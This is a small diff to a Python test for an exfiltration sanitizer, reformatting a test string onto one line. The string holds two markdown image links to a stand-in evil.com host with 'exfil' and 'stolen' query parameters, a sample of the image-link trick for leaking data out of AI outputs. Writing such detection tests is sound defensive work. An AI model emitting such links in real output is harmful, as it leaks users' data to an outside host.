@@ -56,9 +56,6 @@ class TestExfiltrationDetection:
         assert stats.exfiltration_urls == 0
 
     def test_multiple_exfil_images(self) -> None:
-        text = (
-            "![](https://evil.com/?exfil=1) "
-            "![](https://evil.com/?stolen=2)"
-        )
+        text = "![](https://evil.com/?exfil=1) ![](https://evil.com/?stolen=2)"
         _cleaned, stats = sanitize_exfiltration(text)
         assert stats.exfiltration_urls == 2
